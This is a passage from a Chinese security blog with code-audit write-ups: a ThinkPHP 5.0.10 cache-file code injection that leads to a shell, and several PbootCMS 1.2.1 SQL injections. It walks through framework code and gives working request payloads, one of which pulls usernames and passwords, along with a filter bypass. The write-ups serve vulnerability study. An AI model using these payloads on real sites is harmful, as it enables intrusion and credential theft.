        //$template:application/index\view\index\index.html
        if ($template) {
            $cacheFile = $this-&gt;config[&apos;cache_path&apos;] . $this-&gt;config[&apos;cache_prefix&apos;] . md5($template) . &apos;.&apos; . ltrim($this-&gt;config[&apos;cache_suffix&apos;], &apos;.&apos;);
            //得到一个缓存文件
            //&amp;cacheFile:runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
            ...
            // 页面缓存
            ob_start();
            ob_implicit_flush(0);
            // 读取编译存储
            //$this-&gt;storage:object(think\template\driver\File)
            $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);
            // 获取并清空缓存
            $content = ob_get_clean();
            if (!empty($this-&gt;config[&apos;cache_id&apos;]) &amp;&amp; $this-&gt;config[&apos;display_cache&apos;]) {
                // 缓存页面输出
                Cache::set($this-&gt;config[&apos;cache_id&apos;], $content, $this-&gt;config[&apos;cache_time&apos;]);
            }
            echo $content;
        }
    }
</code></pre><p>在上面的<code>$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</code>我们打印下看看:<br><img src="http://static.zybuluo.com/chhyx/j7ho82m627t9qpqfrmcxcbao/image.png" alt="image.png-75.5kB"><br>D.跟进<code>thinkphp\library\think\template\driver\File.php</code></p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\template\driver\File.php 43行
public function read($cacheFile, $vars = [])
    {   
        //$vars:{ [&quot;cacheFile&quot;]=&gt; string(8) &quot;../1.txt&quot; }
        //$cacheFile:thinkphp5_0_10\runtime\temp\7e5953484e3b2cf427e4490795d079f3.php
        if (!empty($vars) &amp;&amp; is_array($vars)) {
            // 模板阵列变量分解成为独立变量
            extract($vars, EXTR_OVERWRITE);//如果有冲突,覆盖已有变量
        }
        //载入模版缓存文件
        include $cacheFile;//包含php文件
    }
</code></pre><p>上面的<code>extract($vars, EXTR_OVERWRITE);</code>//EXTR_OVERWRITE为默认模式。如果有冲突,则覆盖已有变量。<br>最后成功包含文件。</p>
<p>最后我们来理一下跟进的文件,方便各位小伙伴复现:</p>
<pre><code>assign:index.php-&gt;Controller.php-&gt;View.php 
fetch:index.php-&gt;Controller.php-&gt;View.php-&gt;Think.php-&gt;Template.php-&gt;File.php造成包含
</code></pre><p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118113" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118113</a><br><a href="https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/IuKjTS0Q0VVzuoeSwqZ5Gw</a><br><a href="https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank" rel="noopener">https://mochazz.github.io/2018/04/30/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.x%E3%80%815.x%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/" itemprop="url">代码审计 | ThinkPHP5.0.10-3.2.3缓存函数设计缺陷</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-16T08:15:41+08:00">
                2018-09-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>虽然漏洞利用条件苛刻,一般做开发的没人会这么部署,但是对于学习thinkphp框架审计还是有意义的,就当练手了</p>
</blockquote>
<hr>
<p>审计cms:<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">Thinkphp 5.0.10</a><br>漏洞利用条件:</p>
<pre><code>1.缓存使用文件方式并且缓存目录暴露在web目录下面
2.攻击者要能猜到开发者使用的缓存key
</code></pre><p>##<strong>1.基础知识:</strong><br>助手函数cache()：<br><img src="http://static.zybuluo.com/chhyx/ksell9euf1bwfuwk0qo1xrj7/image_1cng34cnd148m1g2c1lnv15n6f3813.png" alt="image_1cng34cnd148m1g2c1lnv15n6f3813.png-41kB"></p>
<p>其他基础知识可参考文章:<br><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/</a></p>
<p>##<strong>2.环境搭建</strong><br>根据官网下的<a href="http://www.thinkphp.cn/down.html" target="_blank" rel="noopener">安装包</a>安装成功后,根据官网的手册我们用助手函数cache()简单写一个缓存使用方法<br>index.php:</p>
<pre><code>#thinkphp5_0_10\application\index\controller\Index.php
&lt;?php
namespace app\index\controller;
use think\Cache;//引入缓存  
class Index
{
    public function index()
    {
        $options = [
            // 缓存类型为File
            &apos;type&apos;  =&gt;  &apos;File&apos;, 
            // 缓存有效期为永久有效
            &apos;expire&apos;=&gt;  0, 
            //缓存前缀
            &apos;prefix&apos;=&gt;  &apos;think&apos;,
             // 指定缓存目录
            &apos;path&apos;  =&gt;  APP_PATH.&apos;runtime/cache/&apos;,
    ];
        cache($options);set //缓存初始化
            $name =input(&apos;get.name&apos;);//助手函数input()获取get传递的name参数
        cache(&apos;name&apos;,$name,3600);//设置缓存数据(有效期一个小时)
            var_dump(cache(&apos;name&apos;));//获取缓存数据

        }

}
</code></pre><p>##<strong>3.漏洞利用</strong><br>payload:</p>
<pre><code>/public/index.php/index/index/index?name=%2F%2F%0D%0Aphpinfo();//
</code></pre><p>其中<code>%2F%2F%0D%0A</code> 表示的是 //加换行符<br><img src="http://static.zybuluo.com/chhyx/w4fvp557kotsf3vaptvzelpz/image_1cng33f9m16111b1917v61i1h15oam.png" alt="image_1cng33f9m16111b1917v61i1h15oam.png-23kB"></p>
<p>访问写入我们php代码的缓存文件<br><img src="http://static.zybuluo.com/chhyx/4168cg3738qisc8fgs9dujhn/image_1cng2gaeoeoh8tffriu6c1sa9.png" alt="image_1cng2gaeoeoh8tffriu6c1sa9.png-45.3kB"></p>
<p>##<strong>4.代码分析</strong><br>A.助手函数cache()定义的地方</p>
<pre><code>#thinkphp\helper.php 353行
function cache($name, $value = &apos;&apos;, $options = null, $tag = null)
{   
    //初始化的一些操作
    if (is_array($options)) {
        // 缓存操作的同时初始化
        $cache = Cache::connect($options);
    } elseif (is_array($name)) {
        // 缓存初始化
        return Cache::connect($name);
    } else {
        $cache = Cache::init();
    }
    ......
        if (is_null($tag)) {
            return $cache-&gt;set($name, $value, $expire);
            //进入set()方法
</code></pre><p>B.跟入<code>set()</code>方法,在<code>thinkphp\library\think\cache\driver\File.php</code>中:<br>具体变量的值已经写入注释中:</p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\cache\driver\File.php 137行
public function set($name, $value, $expire = null)
{   
    //$name=name
    //$value=// phpinfo();//
    if (is_null($expire)) {
        $expire = $this-&gt;options[&apos;expire&apos;];
    }
    $filename = $this-&gt;getCacheKey($name);//得到filename
    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
        $first = true;
    }
    $data = serialize($value);//$data=s:16:&quot;// phpinfo();//&quot;;
    if ($this-&gt;options[&apos;data_compress&apos;] &amp;&amp; function_exists(&apos;gzcompress&apos;)) {
        //数据压缩
        $data = gzcompress($data, 3);  //配置中无data_compress这个元素
    }
    $data   = &quot;&lt;?php\n//&quot; . sprintf(&apos;%012d&apos;, $expire) . $data . &quot;\n?&gt;&quot;;
    //$data = //000000003600s:16:&quot;//
              //phpinfo();//&quot;;
    $result = file_put_contents($filename, $data);
    //直接写入filename文件中
    if ($result) {
        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
        clearstatcache();
        return true;
    } else {
        return false;
    }
}
</code></pre><p>C.由代码可看到 在这里只是对写入的内容<code>$data</code>进行了<code>serialize()</code>反序列化操作 最后对<code>$data</code>进行简单的拼接就写入生成的缓存文件中,造成可写入php代码造成getshell<br>其中:</p>
<pre><code>1.sprintf()将缓存有效期时间3600s 用0填充为12位写入(000000003600)
2.关于换行符,serialize()并不会对其过滤
3.在对$data进行拼接时只是简单的//单行注释 我们用回车就可以绕过
</code></pre><p>D.其中142行左右缓存文件名的获取方法<code>getCacheKey()</code>:</p>
<pre><code>#thinkphp5_0_10\thinkphp\library\think\cache\driver\File.php 70行
protected function getCacheKey($name, $auto = false)
 {
     $name = md5($name);
     if ($this-&gt;options[&apos;cache_subdir&apos;]) {
         // 使用子目录
         $name = substr($name, 0, 2) . DS . substr($name, 2);
     }
     if ($this-&gt;options[&apos;prefix&apos;]) {
         $name = $this-&gt;options[&apos;prefix&apos;] . DS . $name;
     }
     $filename = $this-&gt;options[&apos;path&apos;] . $name . &apos;.php&apos;;
     $dir      = dirname($filename);

     if ($auto &amp;&amp; !is_dir($dir)) {
         mkdir($dir, 0755, true);
     }
     return $filename;
 }
</code></pre><p><img src="http://static.zybuluo.com/chhyx/9d8wtpisvts6ixs923a47tdn/image_1cnh6ta3h30v1n84mbqkd87me9.png" alt="image_1cnh6ta3h30v1n84mbqkd87me9.png-17.2kB"><br>因为配置<code>cache_subdir</code>已经在本文件定义 所以进入第一个if语句</p>
<pre><code>$name = substr($name, 0, 2) . DS . substr($name, 2);
</code></pre><p>将前两个字母作为目录 后面的作为缓存文件名<br><img src="http://static.zybuluo.com/chhyx/j0rbrsvh4ehq2w3a3e7oi4o0/image_1cnh76und14p68m81ijb12voslem.png" alt="image_1cnh76und14p68m81ijb12voslem.png-118kB"></p>
<p>最后得到文件名,与生成的一致。<br><img src="http://static.zybuluo.com/chhyx/bd8g6v60kzrettpgiijp4e0j/image_1cnh7dqusdf6aufuu6np121r13.png" alt="image_1cnh7dqusdf6aufuu6np121r13.png-16.1kB"></p>
<p>最后访问这个php文件即可</p>
<p>参考链接:<br><a href="https://www.kancloud.cn/manual/thinkphp5/118131" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118131</a><br><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/15/PbootCMS_V1.2.1详细审计SQL注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/09/15/PbootCMS_V1.2.1详细审计SQL注入/" itemprop="url">代码审计 | PbootCMS_V1.2.1详细审计SQL注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-15T08:15:41+08:00">
                2018-09-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>之前几周复现审计文章,但是轮到自己去挖掘的时候还是两眼黑,感谢P师傅的指点,成功学习了一波,记录下来,希望自己早日进阶代码审计。</p>
</blockquote>
<hr>
<blockquote>
<p>一.前期收集审计信息</p>
</blockquote>
<p><strong>1.部署CMS</strong><br><code>PbootCMS</code>部署是很方便的,直接下载下来即可使用,但是系统默认使用<code>sqlite</code>的,因为笔者用<code>mysql</code>用的比较多,那这里我就以<code>mysql</code>数据库安装来跑程序。在<code>config\database.php</code></p>
<p><img src="http://static.zybuluo.com/chhyx/tfjaax218vlz4iaj05vy8m28/image_1cpp8jqdc7mrhtd8mj1f311htf19.png" alt="image_1cpp8jqdc7mrhtd8mj1f311htf19.png-97.3kB"></p>
<p>然后自己创建数据库<code>pbootcms</code>,导入<code>static\backup\sql\20180720164810_pbootcms.sql</code>的sql语句并执行,看到下面内容就表明数据库部署成功<br><img src="http://static.zybuluo.com/chhyx/57n9bc88jdbb3dfi5kyxslqu/image_1cpp8o9a954m1t1rnrhatv82k1m.png" alt="image_1cpp8o9a954m1t1rnrhatv82k1m.png-30.7kB"><br>然后重新打开网站 看到如下内容表明<code>PbootCMS</code>部署成功<br><img src="http://static.zybuluo.com/chhyx/wow4n0eyjmgjmkmlcel2lmvp/image_1cpp8s3l61169stgg4m1p271m5j2j.png" alt="image_1cpp8s3l61169stgg4m1p271m5j2j.png-857.4kB"></p>
<p><strong>2.分析系统整体架构:</strong></p>
<pre><code>PbootCMS-V1.2.1
├─ apps         应用程序
│  ├─ admin     后台模块
│  ├─ api       api模块
│  ├─ common    公共模块
│  ├─ home      前台模块
├─ config       配置文件
│  ├─ config.php    配置文件
│  ├─ database.php  数据库配置文件
│  ├─ route.php     用户自定义路由规则
├─ core         框架核心
│  ├─ function  框架公共函数库
│  │  ├─ handle.php 助手函数库1
│  │  ├─ helper.php 助手函数库2
├─ template     html模板
├─ admin.php    管理端入口文件
├─ api.php      api入口文件
├─ index.php    前端入口文件
</code></pre><p>这里列出一些重要的目录,可快速了解系统,有3个入口文件(<code>admin.php,api.phpi,ndex.php</code>)分别对应<code>apps</code>目录下的几个模块(<code>admin,api,home</code>)</p>
<p><strong>3.确定路由走向</strong><br>经过初步测试,路由走向主要分为自定义路由跟普通MVC模式路由模式。<br>自定义路由:<br>查看路由文件 <code>apps\common\route.php</code><br><img src="http://static.zybuluo.com/chhyx/bk5dzuwptrot91ztl3ihidvu/image_1cpp986o17ian8je3v6hd17713d.png" alt="image_1cpp986o17ian8je3v6hd17713d.png-121kB"></p>
<p>举个例子:</p>
<pre><code>http://127.0.0.1/index.php/list/11
</code></pre><p>经过上面系统自定义路由解析后访问的是</p>
<pre><code>http://127.0.0.1/home/list/index/scode/11
</code></pre><p>定位:<code>home</code>模块<code>list</code>控制器<code>index</code>方法<code>scode</code>参数</p>
<p>普通MVC模式:<br>对于上面没有自定义的路由规则来说,直接按照MVC模式访问即可<br>例如:</p>
<pre><code>http://127.0.0.1:89/index.php/Message/add
</code></pre><p>定位:<code>apps\home\controller\MessageController.php</code>的<code>add()</code>方法</p>
<p><strong>4.系统参数过滤情况</strong><br>a.原生态的<code>GET,POST,REQUEST</code>过滤情况<br>找一处外部可访问的地方按如下方式测试即可:<br><img src="http://static.zybuluo.com/chhyx/j2gwd0qtkf9wezdhp9q7u4wz/image_1cplpaupq1u6m1sjvtrk157tksi9.png" alt="image_1cplpaupq1u6m1sjvtrk157tksi9.png-112.5kB"></p>
<p>根据浏览器输出我们可知原生态的获取数据方式是完全不过滤的</p>
<p>b.系统自带函数<code>get,post,request,cookie</code>过滤情况:</p>
<pre><code>#core\function\help.php
function get(
function post(
function request(
function cookie(
</code></pre><p>这里前3个函数都会调用<code>filter()</code>进行过滤,<code>filter()</code>会调用<code>escape_string()</code>函数,<code>Cookie</code>是直接进行<code>escape_string()</code>过滤</p>
<pre><code>#core\functionhandle.php
function escape_string($string, $dropStr = true)
{
    if (! $string)
        return $string;
    if (is_array($string)) { // 数组处理
        foreach ($string as $key =&gt; $value) {
            $string[$key] = escape_string($value);
        }
    } elseif (is_object($string)) { // 对象处理
        foreach ($string as $key =&gt; $value) {
            $string-&gt;$key = escape_string($value);
        }
    } else { // 字符串处理
        if ($dropStr) {
            $string = preg_replace(&apos;/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i&apos;, &apos;&apos;, $string);
        }
        $string = htmlspecialchars(trim($string), ENT_QUOTES, &apos;UTF-8&apos;);
        $string = addslashes($string);
    }
    return $string;
}
</code></pre><p>根据代码我们可以看到<br>0x1.首先这里经过了<code>preg_replace</code>正则匹配,对一些敏感词汇进行了过滤<br>0x2.<code>htmlspecialchars()</code>函数html实体编码(单双引号都过滤)<br>0x3.<code>addslashes()</code>函数转义</p>
<p>注意:<br>这里的过滤只针对<code>value</code>而<code>key</code>完全无过滤<br>正则绕过很简单,只需要<code>updateupdatexmlxml</code>即可绕过</p>
<p>因为这里绕过<code>html编码</code>与<code>addslashes()</code>函数而进行sql注入不现实<br>所以我们将重点放在key上面</p>
<p><strong>5.了解系统DB类,数据库底层的操作方法</strong><br>这里涉及代码太多,我们只需要对一些关键的地方进行了解即可</p>
<pre><code>#PbootCMS\core\basic\Model.php
</code></pre><p>通过读DB底层操作代码发现这里大部分都是字符串拼接,只要可以带入’或<code>即可注入。因为在value处注入不现实,现在我们把重点放在可控的数组上--&gt;寻找参数可为数组且用</code>key`直接拼接的操作方法</p>
<p>这里找到 <code>table()  name() field() where() order() insert() insertGetId() (调用的insert方法)  update()</code>等具有“漏洞”的操作</p>
<blockquote>
<p><strong>二.漏洞寻找及利用</strong></p>
</blockquote>
<p>这里咱们咱们重点关注前台sql注入<br>搜索方法:<br>  <strong>0x01.</strong>在<code>home\controller</code>中查找直接调用上述操作方法的函数—&gt;构建<code>sql</code><br>  <strong>0x02.</strong>在<code>home\model</code>查找调用上述操作方法的函数<code>a()</code>–&gt;返回<code>home\controller</code>中再次寻找调用<code>a()</code>函数的方法—&gt;构建<code>sql</code><br>  <strong>0x03.</strong>在公共函数库<code>apps\common</code>查找调用上述操作方法的函数<code>b()</code>–&gt;返回<code>home\controller</code>中寻找调用<code>b()</code>函数的方法—&gt;构建<code>sql</code></p>
<p>经过上面的前期审计分析,我们心中已经有了*数,接下来就是调试构造即可,这里就以实际挖掘的过程来讲解吧。</p>
<p>##<strong>1.Insert 注入一</strong><br><strong>代码分析:</strong><br>笔者本地测试关闭了验证码的验证,在实战中利用填写正确的验证码即可。<br>搜索<code>insert()</code>–&gt;在<code>home\model\ParserModel.php</code>找到<code>addMessage()</code>函数调用了<code>insert()</code>操作</p>
<pre><code>public function addMessage($data)
{
    return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
}
</code></pre><p>我们在搜索下<code>home\controller</code>哪里调用了<code>addMessage()</code>函数,在<code>MessageController.php</code>找到<code>add()</code>方法:</p>
<pre><code>public function add()
    {
        if ($_POST) {
        ...
        // 接收数据
        $mail_body = &apos;&apos;;
        foreach ($form as $value) {
            $field_data = post($value-&gt;name);
            if (is_array($field_data)) { // 如果是多选等情况时转换
                $field_data = implode(&apos;,&apos;, $field_data);
            }
            if ($value-&gt;required &amp;&amp; ! $field_data) {
                alert_back($value-&gt;description . &apos;不能为空！&apos;);
            } else {
                $data[$value-&gt;name] = post($value-&gt;name);
                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
            }
        }
        ...

        if ($this-&gt;model-&gt;addMessage($data)) {
            ...
        }
    }
</code></pre><p>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将POST提交的数组直接赋值给<code>$data</code>–&gt;进入<code>addmessage()---&gt;inert()</code> 造成注入。</p>
<p><strong>payload:</strong></p>
<pre><code>url: http://127.0.0.1:89/index.php/Message/add
POST: contacts[id`) values (1 and updatexml(1,concat(0x7e,user(),1),1)); -- a]=1&amp;content=1&amp;mobile=1
</code></pre><p><strong>漏洞利用:</strong><br><img src="http://static.zybuluo.com/chhyx/ka58v3fqgjjbual6zb6mcq4c/image_1cpn0rgnj169h14k21ag1ulrksd9.png" alt="image_1cpn0rgnj169h14k21ag1ulrksd9.png-120.3kB"></p>
<p>##<strong>2.Insert 注入二</strong><br>注意:本地测试时,需要添加一条数据才能注入,真实环境下,如果开放这个通话功能时即可直接注入<br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>insert</code>操作的函数,发现函数<code>addForm()</code></p>
<pre><code>#home\Model\ParserModel.php  addForm()
public function addForm($table, $data)
{
    return parent::table($table)-&gt;insert($data);
}
</code></pre><p>我们在搜索下<code>home\controller</code>中调用<code>addForm()</code>函数的方法,在<code>FormController.php</code>找到<code>add()</code>方法:</p>
<pre><code>#home\controller\FormController.php add()
public function add()
{
    if ($_POST) {
        ...
    if ($fcode == 1) {
            alert_back(&apos;表单提交地址有误，留言提交请使用留言专用地址!&apos;);
        }
        ...
    if (! $form = $this-&gt;model-&gt;getFormField($fcode)) {
        alert_back(&apos;接收表单不存在任何字段，请核对后重试！&apos;);
    }
    foreach ($form as $value) {
        $field_data = post($value-&gt;name);
        if (is_array($field_data)) { // 如果是多选等情况时转换
            $field_data = implode(&apos;,&apos;, $field_data);
            }
        if ($value-&gt;required &amp;&amp; ! $field_data) {
            alert_back($value-&gt;description . &apos;不能为空！&apos;);
        } else {
            $data[$value-&gt;name] = post($value-&gt;name);
            $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
            }
        }
        ...
    if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) {
</code></pre><p>跟进<code>getFormField()</code>查看:</p>
<pre><code>    public function getFormField($fcode)
{   ...
    return parent::table(&apos;ay_form a&apos;)-&gt;field($field)
        -&gt;where(&quot;a.fcode=&apos;$fcode&apos;&quot;)
        -&gt;join($join)
        -&gt;order(&apos;b.sorting ASC,b.id ASC&apos;)
        -&gt;select();
}
</code></pre><p><code>fcode</code>为<code>ay_form</code>表的一个字段,只要<code>fcode</code>为2的字段存在即可注入<br>这里的<code>$data[$value-&gt;name] = post($value-&gt;name);</code>表明将<code>POST</code>提交的数组直接赋值给<code>$data--&gt;addForm()---&gt;inert()</code> 造成注入。</p>
<p><strong>payload:</strong></p>
<pre><code>url: http://127.0.0.1:89/index.php/Form/add?fcode=2
POST: tel[id`) values (1 and updatexml(1,concat(0x7e,user()),1)); -- a]=12
</code></pre><p><strong>漏洞利用：</strong><br>要完成漏洞利用,需要在数据库中添加一个字段使得<code>fcode</code>为2<br>我们在后台新增一个表单:<br><img src="http://static.zybuluo.com/chhyx/2wru3avgsj3u0ykcqhjknf83/image_1cpo24s2d92r1gfl11rpq1vkj9.png" alt="image_1cpo24s2d92r1gfl11rpq1vkj9.png-62.4kB"></p>
<p>新增一个字段:<br><img src="http://static.zybuluo.com/chhyx/2dienx7ri5ej67imlqkos8s6/image_1cpo26dqd6r61d4l18vt1lj3190km.png" alt="image_1cpo26dqd6r61d4l18vt1lj3190km.png-66.3kB"><br><img src="http://static.zybuluo.com/chhyx/512i12ionncb6jg75lqax0b0/image_1cpo3bvr5f7j7cc2nd11vn1u92p.png" alt="image_1cpo3bvr5f7j7cc2nd11vn1u92p.png-226.7kB"></p>
<p>数据库:<br><img src="http://static.zybuluo.com/chhyx/xwhvuc5mi1kmtkf75xw92quv/image_1cppm94mf134u1t061qtg1rpg9rm9.png" alt="image_1cppm94mf134u1t061qtg1rpg9rm9.png-283.3kB"></p>
<p>注入:<br><img src="http://static.zybuluo.com/chhyx/397nmoityn6jgrqcufb2k6g2/image_1cpo3qdm010e7kr78vm1jl6e9o1j.png" alt="image_1cpo3qdm010e7kr78vm1jl6e9o1j.png-362.4kB"></p>
<p>##<strong>3.主页处注入</strong><br><strong>代码分析:</strong><br>A.这里继续寻找在<code>home\Model</code>中寻找调用<code>where</code>操作的函数<br>找到2处<code>getList</code>与<code>getSpecifyList</code>,两处的利用点都在<code>where</code>操作里:</p>
<pre><code>public function getList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
{
    ...
    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
        -&gt;where($where1, &apos;OR&apos;)
        -&gt;where($where2)    //触发点
        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
    ...
}
</code></pre><p>-</p>
<pre><code>public function getSpecifyList($scode, $num, $order, $filter = array(), $where = array(), $fuzzy = true)
{
    ...
    return parent::table(&apos;ay_content a&apos;)-&gt;field($fields)
        -&gt;where($where1, &apos;OR&apos;)
        -&gt;where($where2) //触发点
        -&gt;where($where, &apos;AND&apos;, &apos;AND&apos;, $fuzzy)
        ...
}
</code></pre><p>B.我们再搜索下<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSpecifyListLabel()</code>方法:</p>
<pre><code>public function parserSpecifyListLabel($content)
{
    $pattern = &apos;/\{pboot:list(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:list\}/&apos;;
    $pattern2 = &apos;/\[list:([\w]+)(\s+[^]]+)?\]/&apos;;
    if (preg_match_all($pattern, $content, $matches)) {
        $count = count($matches[0]);
        for ($i = 0; $i &lt; $count; $i ++) {
            // 获取调节参数
            $params = $this-&gt;parserParam($matches[1][$i]);
            ...
            // 数据筛选
            $where2 = array();
            foreach ($_GET as $key =&gt; $value) {//漏洞触发点
                if (substr($key, 0, 4) == &apos;ext_&apos;) { // 其他字段不加入
                    $where2[$key] = get($key); 
                }
            } 
            ...
            // 读取数据
            //5 4   date DESC,sorting ASC,id DESC  array(0)
            if ($page) {
                $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);
            } else {
                $data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);
            }
</code></pre><p>C.阅读代码先判断GET传输过来的<code>key</code>值前4位是否为<code>ext_</code>(扩展字段),如果是的话,直接赋值给<code>$where2</code>,然后进入读取数据操作,调用<code>getList</code>或<code>getSpecifyLis</code><br>触发注入。</p>
<p>D.我们追溯调用该<code>parserSpecifyListLabel()</code>函数的方法:<br> <code>parserSpecifyListLabel()---&gt;parserAfter()---&gt;index(IndexController.php)</code> 查看该index函数:</p>
<pre><code>public function index()
{
    $content = parent::parser(&apos;index.html&apos;); // 框架标签解析
    ...
    $content = $this-&gt;parser-&gt;parserAfter($content); // CMS公共标签后置解析   跟进这个方法
    $this-&gt;cache($content, true);
}
</code></pre><p>这里逻辑就很清楚了,利用系统解析list标签下的ext扩展字段来进行注入。<br>这里key值为任意扩展字段(<code>ext_price ext_type ext_color</code>)即可:<br><img src="http://static.zybuluo.com/chhyx/vi4grkematw263ehpl3t7cgx/image_1cpqr3p931934f811s0lfhspuk18.png" alt="image_1cpqr3p931934f811s0lfhspuk18.png-106.9kB"></p>
<p>漏洞涉及文件:</p>
<pre><code>IndexController.php的index()---&gt;parserAfter()---&gt;parserSpecifyListLabel()--&gt;getList()/getSpecifyList()---&gt;where() 
</code></pre><p>直接拼接key造成注入</p>
<p><strong>漏洞利用:</strong><br>因为系统会将空格转化为_ 我们可用/**/来绕过。</p>
<pre><code>payload: http://127.0.0.1:89/index.php?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x23,password)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
</code></pre><p>因为updatexml的最大长度为32位,所以在查询password时会显示不全,我们在实战过程中可以单独读取password字段或者利用其他函数注入即可。这个之后文章讨论。</p>
<p>注入:<br><img src="http://static.zybuluo.com/chhyx/msmqe1h5bab7lemysg3zrb2l/image_1cpql0h0g1r4qia91d3l1oms6kq9.png" alt="image_1cpql0h0g1r4qia91d3l1oms6kq9.png-216.5kB"></p>
<p>##<strong>4.搜索处注入</strong><br>代码分析:<br>A.我们继续搜索<code>home\controller</code>中调用<code>getList()</code>或<code>getSpecifyList（）</code>函数的方法,在<code>ParserController.php</code>找到<code>parserSearchLabel()</code>方法。</p>
<pre><code>public function parserSearchLabel($content)
{
    $pattern = &apos;/\{pboot:search(\s+[^}]+)?\}([\s\S]*?)\{\/pboot:search\}/&apos;;
    $pattern2 = &apos;/\[search:([\w]+)(\s+[^]]+)?\]/&apos;;
    ...
            // 存储搜索条件，条件为“并列”关系，由于为模糊匹配，条件为空时意味着“任意”
            $where2 = array();
    ...

            // 数据接收
            foreach ($_GET as $key =&gt; $value) {
                if (! ! $value = get($key, &apos;vars&apos;)) {
                    $where2[$key] = $value;//key 可控
                }
            }
    ...
            // 读取数据
            if (! $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2, $fuzzy)) {
            ...
